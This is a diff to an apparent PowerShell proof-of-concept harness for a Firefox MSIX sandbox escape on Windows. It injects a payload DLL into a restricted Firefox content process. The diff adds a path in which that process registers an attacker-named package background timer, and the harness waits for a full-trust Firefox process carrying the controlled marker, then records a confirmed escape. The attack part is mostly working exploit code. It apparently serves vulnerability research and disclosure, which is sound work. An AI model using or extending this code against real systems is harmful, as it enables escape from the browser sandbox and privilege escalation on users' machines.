@@ -2,7 +2,8 @@
 param(
     [string]$ArtifactRoot = (Join-Path $PSScriptRoot "..\artifacts"),
     [string]$MsixUrl = "https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/dX7_cQx7RHyrDTlnGpbFeA/artifacts/public/build/target.installer.msix",
-    [string]$MsixSha256 = "a7d656acc321ed52cd547ede6f540cfb6dd7272fe89d405ab9ebce5daaba813c"
+    [string]$MsixSha256 = "a7d656acc321ed52cd547ede6f540cfb6dd7272fe89d405ab9ebce5daaba813c",
+    [int]$BackgroundTaskWaitMinutes = 18
 )
 
 Set-StrictMode -Version Latest
@@ -38,6 +39,9 @@ $Verdict = [ordered]@{
     controlled_arguments_observed = $false
     sandbox_token_observed = $false
     full_trust_token_observed = $false
+    background_task_registered = $false
+    background_task_registration_hresult = $null
+    background_proxy_process_observed = $false
 }
 
 function Write-JsonFile {
@@ -123,9 +127,12 @@ function Write-Summary {
         "- Autoland pushlog: ``$($Result.autoland_pushlog_id)``",
         "- Taskcluster MSIX task: ``$($Result.taskcluster_repackage_task)``",
         "- WinRT launch reported success: ``$($Result.api_success)``",
-        "- Controlled profile argument observed: ``$($Result.controlled_arguments_observed)``",
+        "- Controlled launch marker observed: ``$($Result.controlled_arguments_observed)``",
         "- Restricted content token observed: ``$($Result.sandbox_token_observed)``",
-        "- Full-trust token transition observed: ``$($Result.full_trust_token_observed)``"
+        "- Full-trust token transition observed: ``$($Result.full_trust_token_observed)``",
+        "- Renderer registered package timer: ``$($Result.background_task_registered)``",
+        "- Background registration HRESULT: ``$($Result.background_task_registration_hresult)``",
+        "- Background-task proxy process observed: ``$($Result.background_proxy_process_observed)``"
     )
     $Lines | Set-Content -LiteralPath $SummaryPath -Encoding utf8NoBOM
 }
@@ -296,13 +303,16 @@ exit /b %errorlevel%
 
     Write-JsonFile -Value (Get-FirefoxProcesses | Select-Object ProcessId, ParentProcessId, CommandLine) -Path (Join-Path $ArtifactRoot "processes-before.json")
     $EscapedArguments = "-no-remote -new-instance -profile $EscapedProfile -headless about:blank"
+    $BackgroundMarker = "winfire-$Nonce"
+    $BackgroundTaskName = "${BackgroundMarker}:-no-remote:-new-instance:-headless"
     $Injection = Invoke-DriverJson -Arguments @(
         "inject",
         "--pid", $ContentProcess.ProcessId.ToString(),
         "--dll", $LoadablePayload,
         "--local-dll", $Payload,
         "--expected-family", $InstalledPackage.PackageFamilyName,
-        "--launch-args", $EscapedArguments
+        "--launch-args", $EscapedArguments,
+        "--background-task-name", $BackgroundTaskName
     ) -EvidenceName "injection.json"
 
     $Verdict.sandbox_token_observed = [bool](
@@ -316,6 +326,8 @@ exit /b %errorlevel%
     }
 
     $Verdict.api_success = [bool]($Injection.call_hresult -eq 0 -and $Injection.launch_result -eq 0 -and $Injection.extended_error -eq 0)
+    $Verdict.background_task_registered = [bool]$Injection.background_registered
+    $Verdict.background_task_registration_hresult = $Injection.background_register_hresult_hex
     $LaunchedProcess = $null
     $Launched = $null
     if ($Verdict.api_success) {
@@ -330,14 +342,36 @@ exit /b %errorlevel%
             )
         }
     }
+
+    if (-not $Verdict.api_success -and $Verdict.background_task_registered) {
+        $LaunchedProcess = Wait-EscapedFirefoxProcess -ProfileMarker $BackgroundMarker -Deadline (Get-Date).AddMinutes($BackgroundTaskWaitMinutes)
+        if ($null -ne $LaunchedProcess) {
+            $Launched = Invoke-DriverJson -Arguments @("inspect", "--pid", $LaunchedProcess.ProcessId.ToString()) -EvidenceName "background-launched.json"
+            $Verdict.controlled_arguments_observed = [bool]($Launched.command_line -like "*$BackgroundMarker*")
+            $Verdict.full_trust_token_observed = [bool](
+                $Launched.integrity_rid -ge 8192 -and
+                -not $Launched.is_restricted -and
+                $Launched.package_family -eq $InstalledPackage.PackageFamilyName
+            )
+            $Verdict.background_proxy_process_observed = [bool](
+                $Verdict.controlled_arguments_observed -and $Verdict.full_trust_token_observed
+            )
+        }
+    }
     Write-JsonFile -Value (Get-FirefoxProcesses | Select-Object ProcessId, ParentProcessId, CommandLine) -Path (Join-Path $ArtifactRoot "processes-after.json")
 
-    if ($Verdict.api_success -and $Verdict.controlled_arguments_observed -and $Verdict.full_trust_token_observed) {
+    if ($Verdict.background_proxy_process_observed) {
+        $Verdict.status = "CONFIRMED_BACKGROUND_TASK_PROXY"
+        $Verdict.reason = "A restricted untrusted-integrity Firefox content process registered an attacker-named package timer. Windows activated Mozilla's declared background-task AppContainer, which launched a full-trust Firefox process carrying the controlled marker."
+    } elseif ($Verdict.api_success -and $Verdict.controlled_arguments_observed -and $Verdict.full_trust_token_observed) {
         $Verdict.status = "CONFIRMED"
         $Verdict.reason = "A restricted low-integrity Firefox browser content process invoked FullTrustProcessLauncher successfully, and Windows created a non-restricted medium-integrity packaged Firefox process carrying the controlled profile argument."
     } elseif (-not $Verdict.api_success -and [string]::IsNullOrEmpty($Injection.caller_inside.package_family)) {
         $Verdict.status = "BLOCKED_NO_PACKAGE_IDENTITY"
         $Verdict.reason = "The sandboxed Firefox content process did not retain package identity, and the full-trust launch did not succeed on this runner."
+    } elseif ($Verdict.background_task_registered) {
+        $Verdict.status = "INCONCLUSIVE_BACKGROUND_TIMER"
+        $Verdict.reason = "The compromised content process registered the package background timer, but no controlled full-trust launch was observed before the runner deadline."
     } elseif ($Injection.launch_result -eq 1 -or $Injection.call_hresult_hex -eq "0x80070005" -or $Injection.extended_error_hex -eq "0x80070005") {
         $Verdict.status = "BLOCKED_BY_WINDOWS"
         $Verdict.reason = "The call originated inside the sandboxed Firefox content process, but Windows returned access denied and no sandbox escape was demonstrated."
